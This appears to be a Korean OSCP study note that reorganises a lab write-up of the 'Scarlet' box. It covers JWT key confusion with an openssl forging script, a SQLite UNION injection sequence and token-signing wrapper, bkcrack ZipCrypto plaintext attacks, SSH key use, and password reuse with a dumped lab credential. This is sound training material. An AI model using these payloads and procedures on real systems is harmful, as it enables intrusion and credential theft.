> ⚠️ **작업이 끝나면 반드시 마운트를 푼다**(A-42). [[Scarlet]] 이 남긴 `/tmp/nfs` 죽은 마운트가 이후 세 박스의 백그라운드 작업을 전부 블록시킨 사고가 실재한다.

**④ 지우기 전 원문** — 옛 노트 `1장` NFS 콜아웃 + `2-1절` 전문 + `3-1절` 플래그 표·콜아웃 + `7장 2·3번`(`_backup\Scarlet.md.bak` 107~113 · 295~304 · 312~362 · 532~552 · 1667~1674행). 위 본문이 그 전량이다.

---

## B-2. JWT 공격 4갈래 — `alg` 를 먼저 본다

**① 절:** `B-1. 웹` — **신규**
**② 신규**
**③ 넣을 본문**

> **JWT 를 보면 순서는 하나다 — ① 헤더의 `alg` 를 본다 → ② `RS*` 면 공개키를 찾는다 → ③ `HS*` 면 비밀키를 크랙한다 → ④ `kid`/`jku`/`x5u` 가 있으면 그쪽을 판다.**
>
> | 공격 | 조건 | 방법 |
> |---|---|---|
> | `alg: none` | 서버가 `none` 을 수용 | 헤더를 `{"alg":"none"}`, 서명 조각을 빈 문자열로 |
> | RS256 → HS256 키 혼동 | **공개키 확보** + 검증이 대칭 알고리즘을 허용 | 공개키를 HMAC 비밀키로 삼아 재서명 |
> | 약한 HMAC 비밀키 | HS256 인데 비밀키가 사전 단어 | `hashcat -m 16500 token.txt rockyou.txt` |
> | `kid` 인젝션 | 헤더 `kid` 가 파일 경로/SQL 로 쓰임 | `../../dev/null` + 빈 키, 또는 SQLi |
>
> **키 혼동의 메커니즘** — `HS256` 은 대칭(HMAC), `RS256` 은 비대칭이다. 라이브러리가 **토큰 헤더의 `alg` 를 보고 검증 방식을 고르면** 데이터 흐름이 뒤집힌다: 「HS256 이네 → HMAC 검증이다 → 두 번째 인자를 HMAC 비밀키로 쓰자」인데 그 두 번째 인자가 **공격자도 아는 공개키**다. 즉 **「검증용 공개키」가 「서명용 비밀키」로 재해석된다.**
>
> ⚠️ **원인이 「알고리즘 미지정」이라고만 외우지 마라 — 화이트리스트를 «잘못 채운» 경우가 실재한다.** [[Scarlet]] 의 실제 소스는 이랬다:
> ```js
> // helpers/JWTHelper.js  (jsonwebtoken ^8.5.1)
> const publicKey = fs.readFileSync('./public.key', 'utf8');
> jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })
> ```
> `algorithms` 를 **명시했는데도** 비대칭과 대칭을 한 목록에 넣어 공격이 성립했다. 방어는 `algorithms: ['RS256']` — **대칭 알고리즘을 목록에서 빼는 것**이지 목록을 붙이는 것 자체가 아니다.
>
> **재료 조건 — 공개키의 바이트가 정확히 일치해야 한다.** HMAC 비밀키는 바이트열이고 서버는 파일에서 읽은 PEM 문자열 그대로(줄바꿈·마지막 개행 포함)를 키로 쓴다. **개행 하나만 달라도 실패한다. 실패했다면 트레일링 개행 유무를 먼저 의심할 것.**
>
> **jwt_tool 플래그** — `-X k`(key confusion) · `-X a`(alg:none) · `-X s`(서명 제거) · `-pk <파일>`(공개키) · `-T`(대화형 tamper) · `-I -pc <키> -pv <값>`(비대화형 클레임 주입, 스크립트용) · `-C -d <wordlist>`(HMAC 비밀키 크랙).
>
> ⚠️ **jwt_tool 은 시험 금지 도구가 아니지만(자동 익스플로잇이 아님) 시험장 Kali 에 없을 수 있다.** `openssl` 만으로 되는 절차를 익혀둘 것:
> ```bash
> KEY=/path/public.key
> b64() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }   # base64url, 패딩 제거
> H=$(printf '%s' '{"alg":"HS256","typ":"JWT"}' | b64)
> P=$(printf '%s' '{"username":"admin","iat":1787119866}' | b64)
> SIG=$(printf '%s' "$H.$P" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(xxd -p -c 999 "$KEY") -binary | b64)
> echo "$H.$P.$SIG"
> ```
> 함정 셋 — ① **base64url** 이다(`+`→`-`, `/`→`_`, `=` 제거) ② 비밀키는 **파일의 원시 바이트** ③ 트레일링 개행. 파이썬이 있으면 `jwt.encode(payload, open(KEY,'rb').read(), algorithm="HS256")` 한 줄.
>
> ⚠️ **jwt_tool 이 찍는 `TIMESTAMP = … (UTC)` 라벨은 실제로는 로컬 시각이다.** [[Scarlet]] 에서 `iat=1787119866` 을 `2026-08-19 15:11:06 (UTC)` 로 찍었으나 그 UTC 는 `06:11:06` 이고 15:11:06 은 KST(UTC+9)다 — 같은 토큰을 발급한 응답 헤더 `Date: Wed, 19 Aug 2026 06:11:06 GMT` 가 반증한다. `[가정]` 파이썬 `datetime.fromtimestamp()`(로컬 변환)를 쓰고 라벨만 UTC 로 찍는 것으로 보임. **서버 로그와 대조할 때 9시간이 어긋나므로 `date -u -d @<iat>` 로 직접 환산할 것.**
>
> **`exp` 가 없으면 만료가 없다.** [[Scarlet]] 의 쿠키는 `Max-Age=900`(15분)이었으나 토큰에 `exp` 클레임이 없어 서버가 만료를 검사하지 않았고, 최초 `iat` 를 계속 재사용해도 통했다. 반대로 `exp` 가 있는 앱이면 위조할 때 `exp` 도 미래로 밀어야 한다.

**④ 지우기 전 원문** — 옛 노트 `2-2절` 전문 + `3-4절` 플래그 표·콜아웃·수동 대안 + `3-3절 Max-Age` 절 + `7장 5번`(`_backup\Scarlet.md.bak` 364~402 · 670~673 · 720~733 · 778~804 · 1678~1685행). 노트 본문에는 실측 캡처(jwt_tool 실행·`/portal` 200)와 수동 대안, 시각 라벨 경고만 남겼다.

---

## B-3. 인증 미들웨어를 통과한 값이 인젝션의 노른자다

**① 절:** `B-1. 웹` — **신규**
**② 신규**
**③ 넣을 본문**

> **인젝션 지점은 폼 필드만이 아니다** — 쿠키 · JWT 클레임 · 헤더(`X-Forwarded-For`·`User-Agent`·`Referer`) · 파일명 · JSON 키. 그중에서도 **「한 번 검증을 거쳐 내부값이 된 데이터」**가 가장 위험하다. 개발자가 「미들웨어가 서명을 검증했으니 우리가 발급한 값」이라고 믿기 때문이다. **서명이 뚫리면 그 믿음이 전부 취약점이 된다.**
>
> [[Scarlet]] 실측 — 같은 파일 안에서 함수 넷 중 **하나만** 문자열 조립이었다:
> ```js
> // helpers/DBHelper.js
> getUser(username){     db.get(`SELECT * FROM users WHERE username = '${username}'`, …) }  // ← 취약
> checkUser(username){   db.get(`SELECT * FROM users WHERE username = ?`, username, …) }
> attemptLogin(u, p){    db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, …) }
> createUser(u, p){      db.prepare('INSERT INTO users(username, password) VALUES(?,?)') }
> ```
> 즉 개발자는 프리페어드 스테이트먼트를 **알고 있었고 한 군데를 빠뜨렸다.** 그 한 군데가 하필 **토큰 클레임을 받는 경로**였다.
>
> 더 나쁜 것은 **엉뚱한 곳에 방어를 걸어 둔 것**이다 — `routes/index.js` 의 로그인 분기는 토큰 발급 «전»에 `username.replace(/'/g, "''")` 로 따옴표를 이스케이프한다. **위조 토큰은 그 경로를 통째로 건너뛰므로 방어가 되지 못한다.**
> → **「어디서 검증했는가」가 아니라 「이 값이 sink 에 닿기까지 반드시 거치는 경로가 무엇인가」로 볼 것.** 발급 시점 이스케이프는 위조 앞에서 무의미하다.

**④ 지우기 전 원문**

```text
### 2-3. JWT 클레임을 통한 SQL 인젝션 — 인젝션 지점은 폼이 아니다
… 포털은 토큰의 `username` 클레임을 받아 DB에서 사용자를 조회하고, 그 결과를 `<strong>Hey {이름}, <br>` 형태로 화면에 반사한다. 여기가 결정적이다 — **인증 미들웨어가 검증한 값을 "안전한 값"으로 취급해 SQL에 문자열 연결**한 것이다.

```js
// [가정] 원문에는 소스가 없으나 에러 메시지로부터 역산한 형태
const q = "SELECT ... FROM users WHERE username = '" + payload.username + "'";
db.get(q, ...)
```

> [!tip] 인증을 통과한 값일수록 검증이 느슨하다
> 개발자는 "미들웨어가 서명을 검증했으니 이 클레임은 우리가 발급한 값"이라고 믿는다. 서명이 뚫리면 그 믿음이 전부 취약점이 된다.
> 시험 반사: 쿠키·JWT 클레임·`X-Forwarded-For`·`User-Agent`·세션에 저장된 값 — **한 번 검증을 거쳐 "내부값"이 된 데이터가 인젝션의 노른자다.**

(7장 7번)
7. **인젝션 지점은 폼 필드만이 아니다.** 쿠키·JWT 클레임·헤더(`X-Forwarded-For`, `User-Agent`, `Referer`)·파일명·JSON 키. "인증 미들웨어를 통과한 값"이 특히 위험하다 — 개발자가 신뢰하기 때문이다. 값 조작으로 권한이 안 오르면 문법 파괴를 시험하라.
```
✅ **`[가정]` 역산 코드가 실제 소스로 교체됐다.** 원문의 「문자열 연결(`+`)」은 실제로는 **템플릿 리터럴**이었고, 같은 파일의 나머지 셋은 바인딩을 쓰고 있었다.

---

## B-4. SQLite 수동 UNION — 카탈로그·연산자 대조표

**① 절:** `B-12. SQLi 수동 UNION — sqlmap 금지 대비`
**② 병합**
**③ 넣을 본문**

> **SQLite 기준 순서** — 다른 DBMS 를 확정하기 전까지 `-- -`(대시 둘 + 공백 + 임의 문자)로 주석을 쓴다. MySQL 은 `--` 뒤에 공백·제어문자가 있어야 주석으로 인식하고, URL 인코딩 구간에서 뒤 공백이 잘려나가는 사고도 이 관용구로 막힌다.
> ```sql
> '                                         -- 에러 유발 → DBMS 확정
> ' ORDER BY 3-- -      /  ' ORDER BY 4-- - -- 컬럼 수 이진 탐색
> zzz' UNION SELECT 1,2,3-- -               -- 컬럼 수 + 반사 위치를 한 번에
> zzz' UNION SELECT group_concat(name,' '),2,3 FROM sqlite_master WHERE type='table'-- -
> zzz' UNION SELECT group_concat(sql,' '),2,3 FROM sqlite_master WHERE name='users'-- -
> zzz' UNION SELECT group_concat(username||':'||password,'  '),2,3 FROM users-- -
> ```
> **DBMS별 카탈로그 대조표**
>
> | DBMS | 테이블 목록 | 컬럼 목록 | 문자열 연결 |
> |---|---|---|---|
> | SQLite | `sqlite_master` (`name`,`sql`) | `pragma_table_info('t')` | `\|\|` |
> | MySQL | `information_schema.tables` | `information_schema.columns` | `CONCAT()` / `CONCAT_WS()` |
> | PostgreSQL | `pg_tables` / `information_schema.tables` | `information_schema.columns` | `\|\|` |
> | MSSQL | `sys.tables` / `INFORMATION_SCHEMA.TABLES` | `sys.columns` | `+` |
> | Oracle | `all_tables` | `all_tab_columns` | `\|\|` |
>
> ⚠️ **SQLite 에서 `CONCAT()` 을 쓰지 마라.** 함수 자체가 **3.44.0(2023-11-01) 미만에는 없어** `no such function: concat` 이 난다 — [[Scarlet]] 의 Ubuntu 22.04 / sqlite 3.37 이 정확히 그 경우다. 3.44 이후는 가변 인자를 받는다(「인자 정확히 2개」 제한은 **Oracle** 의 `CONCAT` 규칙이지 SQLite 가 아니다). `+` 를 쓰면 숫자 덧셈이 되어 `0` 이 나온다.
>
> **주입 지점이 「토큰 안」이면 sqlmap 은 원리적으로 못 쓴다** — 파라미터를 변조할 때마다 재서명이 필요해 `--eval` 훅이나 프록시 스크립트가 있어야 한다. [[Scarlet]] 은 그래서 처음부터 끝까지 수동이었고, **「페이로드 → 서명 → 전송 → 반사값 추출」을 한 함수로 압축한 래퍼**가 핵심 추상화였다. 이 형태를 그대로 시험에 가져갈 것:
> ```bash
> inject() {
>   local token
>   token=$(python "$JT" "$ORIG" -X k -pk "$PK" -I -pc username -pv "$1" 2>/dev/null | grep -oP '(?<=\[\+\] )ey[A-Za-z0-9._-]+')
>   curl -s "$URL" -H "Cookie: session=$token" | grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'
> }
> ```
> `(?<=…)` 는 너비 0 후방탐색이라 매치 결과에 포함되지 않고, `.*?` 는 최소 매치(greedy 방지)다.
>
> **컬럼 수 탐색은 `UNION SELECT 1,2,3` 쪽이 낫다** — `ORDER BY` 이진 탐색은 개수만 주지만 이쪽은 **개수와 반사 위치를 동시에** 준다. 그리고 원 쿼리를 빈 결과로 만들 것(`zzz'` 처럼 존재하지 않는 값) — 실제 사용자명을 쓰면 원 결과가 1행 반환돼 UNION 결과가 화면에 안 보인다(첫 행만 렌더하는 경우).

**④ 지우기 전 원문** — 옛 노트 `2-4절` 전문(페이로드 조각 표 · `-- -` 꼬리 해설 · 컬럼 수 탐색 예시) + `3-7절` 스크립트 구조 해설 표 + `7장 6번`(`_backup\Scarlet.md.bak` 431~469 · 947~955 · 1687~1703행).
⚠️ **페이로드 조각 표는 노트 본문에 남겼다**(그 박스의 재현에 직접 필요). 이관 대상은 **일반화된 절차·카탈로그 표·`inject()` 추상화**다.

---

## B-5. ZipCrypto known-plaintext (bkcrack)

**① 절:** `B-6. 자격증명·크래킹` — **신규**
**② 신규**
**③ 넣을 본문**

> **zip 의 전통 암호(ZipCrypto, PKWARE 1990)는 96비트 내부 상태(`key0/key1/key2`)를 쓰는 스트림 암호이고, 1994년 Biham–Kocher 의 known-plaintext 공격으로 «비밀번호를 거치지 않고» 내부 키를 직접 복구할 수 있다.** 복구되는 것은 비밀번호가 아니라 내부 키이고, **그 키는 아카이브 전체에 공통**이라 파일 하나의 평문만 알면 나머지 전부가 풀린다.
>
> **요구 평문 길이 — 논문 수치와 도구 수치를 섞지 말 것.** 논문(Biham–Kocher, FSE 1994, LNCS 1008)은 **13바이트**(그중 8바이트 연속), **bkcrack 구현은 12바이트**다. 흔히 「12바이트면 된다」로 뭉뚱그리는데 그것은 도구의 요구치다.
>
> **평문은 「압축된 상태」로 줘야 한다.** zip 엔트리는 보통 deflate 로 압축한 뒤 암호화하므로 넘길 known-plaintext 는 원본이 아니라 **동일한 deflate 스트림**이어야 한다. `unzip -v` 의 `Method` 컬럼으로 판정한다 — `Defl:N` 이면 `bkcrack/tools/deflate.py` 로 변환, `Stored`(무압축)면 원본을 그대로 준다.
> ```bash
> python3 ~/git/bkcrack/tools/deflate.py < known_plain_file > plain.deflate
> ./bkcrack -C target.zip -c path/in/archive -p plain.deflate      # 키 복구
> ./bkcrack -C target.zip -k k0 k1 k2 -D decrypted.zip             # 암호 제거한 새 zip
> unzip decrypted.zip -d out
> ```
>
> | 플래그 | 의미 | 주의점 |
> |---|---|---|
> | `-C <파일>` | 대상 암호화 zip | — |
> | `-c <엔트리>` | 아카이브 안의 어느 엔트리를 아는가 | `unzip -l` 의 이름과 **완전 일치** |
> | `-p <파일>` | 알려진 평문 | **최대 함정.** deflate 엔트리에 원본을 주면 실패 |
> | `-o <오프셋>` | 평문이 엔트리의 몇 바이트째부터 일치하는지 | 부분 평문(헤더만 아는 경우) |
> | `-k k0 k1 k2` | 복구된 내부 키로 복호화 | — |
> | `-D <출력>` | 암호 제거한 새 zip | `-U <출력> <새암호>` 는 재암호화 |
>
> **출력 읽는 법** — `Z reduction using 623 bytes of known plaintext` 의 623 은 **파일 크기가 아니다.** [[Scarlet]] 에서 넘긴 `pub.deflate` 는 630바이트이고 623 은 Z reduction 에 실제로 쓴 값의 개수(= 630 − contiguousSize(8) + 1)다. `Attack on 14181 Z values` 는 후보 공간이고 32.3%(4575번째)에서 해를 찾았다. `--continue-attack 4575` 는 **해가 여럿일 수 있어** 이어서 탐색할 수 있다는 안내다 — 첫 해로 복호화가 실패하면 이것을 쓴다.
>
> **성립 조건을 만드는 발상이 이 공격의 전부다** — 「이 파일의 평문을 내가 안다」는 사실 자체가 무기가 되는 상황. 후보는 둘이다: ① **다른 경로에서 이미 확보한 파일**이 아카이브 안에 있는가 ② **인터넷에서 동일 바이트를 구할 수 있는 표준 파일**(`bootstrap.min.css`·`jquery.min.js`·라이브러리 배포본)이 있는가.
> [[Scarlet]] 은 ①이 정답이었다 — NFS 에서 주운 `public.key`(800바이트)와 `backup.zip` 안의 `web/public.key` 가 동일 파일이라 5초 만에 키가 나왔다. `[가정]` ②도 가능했을 것이다(부트스트랩·mobirise 자산이 잔뜩 들어 있었음) — 다만 **버전이 정확히 일치해야 하므로 실제로는 시도가 필요하다.**
>
> **관련 hashcat 모드** — `-m 13600` WinZip AES · `-m 17225` PKZIP(mixed multi-file) · `-m 17220` PKZIP(compressed multi-file) · `-m 16500` JWT(HS256).

**④ 지우기 전 원문** — 옛 노트 `2-5절` 전문 + `4-3절` 플래그 표·출력 해설 + `4-2절` 콜아웃 + `9장` hashcat 모드 줄(`_backup\Scarlet.md.bak` 471~509 · 1218~1222 · 1265~1280 · 1780행).
⚠️ 노트 본문에는 **실측 bkcrack 실행 캡처와 `unzip -v` 근거만** 남겼다.

---

## B-6. 획득한 파일을 「다 썼다」고 치우지 마라

**① 절:** `A-6. 판단·검증 (메타)` 또는 `B-6` — **신규**
**② 신규 — 배정은 기록자 판단**(성격상 A-6 메타 쪽에 가까움)
**③ 넣을 본문**

> **한 아티팩트가 두 번 쓰인다.** [[Scarlet]] 의 `public.key` 는 **JWT 위조의 HMAC 비밀키**로 한 번, **zip known-plaintext 의 평문**으로 또 한 번 쓰였다. 두 번째 쓰임을 못 떠올리면 그 자리에서 막힌다.
> → **새 벽에 부딪힐 때마다 작업 디렉터리에 모은 아티팩트를 다시 훑을 것.** 「이미 썼다」는 폐기 사유가 아니다.
>
> **공개키를 주웠을 때의 사고 순서** — ① JWT 를 쓰는 앱인가? → `alg` 혼동 후보 ② SSH `authorized_keys` 용인가? → 대응 개인키를 찾아야 하며 공개키 단독으로는 로그인 불가 ③ 키 길이가 짧거나(≤1024) 특이한 modulus 인가? → 인수분해(`RsaCtfTool`·FactorDB) ④ **다른 곳에서 같은 파일을 만날 수 있는가?** → known-plaintext 재료.
> ④가 잘 안 떠오르는 발상이다.

**④ 지우기 전 원문**

```text
(0장) - **한 아티팩트가 두 번 쓰인다** — 같은 `public.key`가 JWT 위조 재료이자 zip 복호화의 known-plaintext였다. 획득한 파일을 "이미 다 썼다"고 치우지 마라

(3-2절)
> [!tip] 공개키를 주웠을 때의 사고 순서
> 1. **JWT를 쓰는 앱인가?** → `alg` 혼동(RS256→HS256) 후보. 이 박스의 정답
> 2. **SSH `authorized_keys`용인가?** → 대응하는 개인키를 찾아야 한다. 공개키 단독으로는 로그인 못 한다
> 3. **키 길이가 짧거나(≤1024) 특이한 modulus인가?** → 인수분해(`RsaCtfTool`, FactorDB) 후보
> 4. **다른 곳에서 같은 파일을 만날 수 있는가?** → known-plaintext 재료. 이 박스의 두 번째 정답
>
> 4번은 잘 안 떠오르는 발상이다. **"이 파일의 평문을 내가 안다"는 사실 자체가 무기가 되는 상황**을 기억해 둬라.

(7장 10번)
10. **획득한 파일을 "다 썼다"고 치우지 마라.** 이 박스의 `public.key`는 JWT 위조 재료로 한 번, zip known-plaintext로 또 한 번 쓰였다. 두 번째 쓰임을 못 떠올리면 여기서 막힌다. 작업 디렉터리에 모은 아티팩트를 새 벽에 부딪힐 때마다 다시 훑는 습관.

(관련 노트) - **새 패턴 "한 아티팩트를 두 번 써라"** — `public.key`가 JWT 위조 재료이자 zip known-plaintext였다. 다른 노트에서 같은 구조를 만나면 여기로 링크할 것
```

---

## B-7. 개인키를 얻었을 때 — 코멘트 · 권한 · 개행

**① 절:** `B-61. 개인키의 주석은 소유자가 아니다`
**② 병합**
**③ 넣을 본문**

> **순서를 지킬 것 — `chmod 600` → `ssh-keygen -l -f` 로 코멘트 확인 → 로그인.** 권한을 안 고치면 키가 «조용히» 무시되고, 코멘트를 안 보면 사용자명을 몰라 헤맨다.
> ```bash
> ssh-keygen -l -f id_rsa        # 지문 + 코멘트를 바로 보여준다
> ssh-keygen -y -f id_rsa        # 대응 공개키 산출 → authorized_keys 와 대조
> grep -o 'cm9vdEB[A-Za-z0-9+/=]*' id_rsa | base64 -d   # 코멘트만 뽑기
> ```
> OpenSSH 개인키 형식은 **끝부분에 코멘트를 평문 base64 로 담는다.** [[Scarlet]] 의 키는 마지막 줄 근처 `AAAAMcm9vdEBzY2FybGV0` = `root@scarlet` 이었고, 그 한 줄로 「이 키는 root 로그인용」이라는 판단이 서 사용자명 탐색이 통째로 사라졌다. 단 **코멘트는 관례일 뿐 보증이 아니다** — 안 맞으면 `/etc/passwd` 의 사용자를 순회한다.
>
> **권한 검사** — `0644` 인 키로 `ssh -i` 를 치면 OpenSSH 는 `WARNING: UNPROTECTED PRIVATE KEY FILE!` 과 함께 `Permissions 0644 for '<파일>' are too open.` · `This private key will be ignored.` 를 찍고 **그 키를 쓰지 않는다.** 「권한 문제」라고 명시해 주지만 급하면 「키가 틀렸나」 하고 엉뚱한 데를 판다. `0600`(또는 `0400`).
> ⚠️ [[Scarlet]] 은 `vi keykey` → `chmod 600` → `ssh -i` 순서라 **이 경고를 실제로 겪지 않았다** — 위 배너 문구는 관측된 출력이 아니라 설명이다.
>
> 부수 함정 둘 — ① 파일이 `root` 소유인데 일반 사용자로 `ssh` 를 쓰면 권한이 맞아도 못 읽는다(`chown $USER:$USER`) ② **에디터가 붙인 CRLF·트레일링 공백**은 키를 깨뜨린다(`file` 로 확인, `dos2unix`).

**④ 지우기 전 원문** — 옛 노트 `4-4절` 콜아웃 + `4-5절` 콜아웃 전문 + `7장 11번`(`_backup\Scarlet.md.bak` 1380~1388 · 1418~1426 · 1723행). 노트 본문에는 코멘트 확인·`chmod 600`·CRLF 만 두 문장으로 남겼다.

---

## B-8. 평문 비밀번호가 나오면 즉시 재사용을 시험한다

**① 절:** `B-6-12. 평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다`
**② 병합**
**③ 넣을 본문**

> **해시가 아니라 «평문»이 나왔다는 것 자체가 신호다.** 해시였다면 크랙 단계가 하나 더 필요했다. 평문 저장은 개발자가 보안을 신경 쓰지 않았다는 뜻이고, 그런 시스템은 **웹 비밀번호 = 시스템 비밀번호**일 확률이 높다.
> ```bash
> ssh user@TARGET                      # 같은 비밀번호
> crackmapexec smb TARGET -u u -p p    # SMB가 있으면
> su - otheruser                       # 셸이 있으면 다른 계정에도
> ```
> [[Scarlet]] — SQLi 로 덤프한 `brian:Standingbytheseaside12` 가 그대로 SSH 로 통했다. **덤프 직후 반사적으로 `ssh <user>@<target>` 을 칠 것.**

**④ 지우기 전 원문**

```text
> [!warning] 비밀번호가 평문 저장이면 재사용을 즉시 의심하라
> 해시였다면 크랙 단계가 하나 더 필요했다. 평문이 나왔다는 것은 개발자가 보안을 신경 쓰지 않았다는 신호이고, 그런 시스템은 **웹 비밀번호 = 시스템 비밀번호**일 확률이 높다.
> **덤프 직후 반사적으로 `ssh <user>@<target>` 을 쳐라.** 여기서는 그게 통했다.

(7장 8번)
8. **평문 비밀번호가 나오면 즉시 SSH·SMB·서비스에 재사용을 시도하라.** 해시가 아니라 평문이 나왔다는 것 자체가 "보안을 신경 안 쓴 시스템"의 신호다.
   ```bash
   ssh user@TARGET                      # 같은 비밀번호
   crackmapexec smb TARGET -u u -p p    # SMB가 있으면
   su - otheruser                       # 셸이 있으면 다른 계정에도
   ```
```

---

## B-9. 웹앱이 어느 uid 로 도는지 먼저 본다

**① 절:** `B-1-40. 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다`
**② 병합**
**③ 넣을 본문**

> **셸을 잡으면 `ps aux | grep <런타임>` 으로 웹앱의 실행 계정부터 확인할 것.** [[Scarlet]] 은 `node /home/brian/web/index.js` 가 **`brian`** 으로 돌고 있었다 — 웹 RCE 를 얻어도 이미 가진 권한이라, 「웹셸을 심어 권한상승」 방향을 즉시 접고 파일 기반 경로로 전환할 수 있었다.
> 반대 사례 — [[Hawat]] 은 nginx 가 root 라 웹셸이 곧 root 였다.
> **판정이 서면 남는 것은 「그 계정이 읽을 수 있는 파일에 무엇이 있는가」다.** [[Scarlet]] 의 답은 `/opt/backup.zip`(`brian brian`) 하나였다.

**④ 지우기 전 원문**

```text
(7장 13번)
13. **웹앱이 어느 uid로 도는지 먼저 확인하라.** `ps aux | grep node` 결과가 `brian`이었다 — 웹 RCE를 얻어도 이미 가진 권한이다. 이걸 알면 "웹셸을 심어 권한상승" 방향을 즉시 접고 다른 곳을 판다. (반대 사례: [[Hawat]]는 nginx가 root라 웹셸이 곧 root였다)
```

---

## E-1. 시험 규정 — jwt_tool · bkcrack · sqlmap

**① 절:** `E. OSCP 시험 규정 — 금지 / 제한 / 허용`
**② 병합**(중복이면 기록자가 드롭)
**③ 넣을 본문**

> | 도구 | 판정 | 근거 |
> |---|---|---|
> | `sqlmap` | **금지**(명시적) | 자동으로 취약점을 발견·익스플로잇 |
> | `jwt_tool` | **허용** | 사용자가 지정한 토큰·키에 대해 지정한 변형을 만들 뿐, 스스로 취약점을 발견하지 않음 |
> | `bkcrack` | **허용** | 암호 분석 도구. 취약점 발견·원격 접근 자동화가 아님 |
> | `username-anarchy` | **허용** | 목록 생성 전용 |
>
> ⚠️ **허용이라고 「깔려 있다」는 뜻은 아니다.** jwt_tool·bkcrack 은 둘 다 [[Scarlet]] 에서 `git clone` 으로 가져다 빌드했다(`~/git/`). **시험장 Kali 에 없을 수 있으므로 수동 대안을 손에 붙여둘 것** — JWT 는 `openssl dgst -mac HMAC`(B-2), zip 은 대안이 사실상 없으므로 **오프라인 준비물**로 취급한다.
> ⚠️ **주입 지점이 서명된 토큰 안이면 sqlmap 은 금지 이전에 원리적으로 못 쓴다** — 변조마다 재서명이 필요하다(B-4).

**④ 지우기 전 원문**

```text
> [!danger] ⚠️ sqlmap은 시험 금지다 — 그리고 여기서는 애초에 쓸 수 없다
> sqlmap은 파라미터를 변조하지만, **여기서는 변조할 때마다 JWT를 재서명해야 한다.** sqlmap 단독으로는 불가능하고 `--eval` 훅이나 프록시 스크립트가 필요하다.
> 이 박스는 처음부터 끝까지 수동 UNION으로 풀렸다. 아래 스크립트는 "자동 익스플로잇 도구"가 아니라 **수동 페이로드를 반복 전송하는 래퍼**다 — 시험에서 허용되는 형태이고, 그대로 가져다 쓸 수 있는 템플릿이다.

> [!danger] ⚠️ 시험 대비 — jwt_tool 없이 손으로 위조하기
> jwt_tool은 금지 도구는 아니지만(자동 익스플로잇이 아니다) **시험장 Kali에 깔려 있지 않을 수 있다.**
```
(노트 본문에는 「sqlmap 은 여기서 원리적으로 못 쓴다」 한 문장과 수동 대안 절차만 남겼다.)

---

## 이관하지 «않은» 것 — 노트 본문에 남긴 것

- **`Vulnerability Fix:` 로 분산** — 옛 `8장 방어 관점` 표 18행 전량. NFS export 제한·키 자료 배치·`algorithms` 화이트리스트·파라미터 바인딩·에러 노출·사용자 열거·`exp` 부재·평문 저장·계정 분리는 `Initial Access` 의 Fix 로, 백업 방치·ZipCrypto·개인키 포함·`PermitRootLogin`·패치 관리는 `Privilege Escalation` 의 Fix 로 옮겼다
- **실측 캡처 전량** — nmap raw · rpcinfo · feroxbuster 2회 · `/etc/hosts` · showmount · NFS 마운트 · public.key · openssl · 로그인 2회 · jwt_tool 3회 · 열거 루프 · SQLITE_ERROR · `scarlet_all.sh` · 실행 출력 · SSH 세션 2회 · `/etc/exports` · SUID · getcap · crontab · `ps aux`/`ls -la /opt` · `namelist()` · `unzip -v` · bkcrack 2회 · `unzip` · `id_rsa`
- **페이로드 조각 표**(`zzz'`·`group_concat`·`||`·`-- -`) — 그 박스의 재현에 직접 필요
- **`[가정]` 표시 전량** — `scarlet.local` 특정 경로 · `4leaf` 출처 · 컬럼 수 탐색 · jwt_tool 시각 라벨 원인 · `bootstrap.min.css` 대체 평문 가능성
- **밟지 않은 길** — `hashes.json`(이번에 열어 해소) · `private.key`(미사용) · `database.db`(사후 확인)
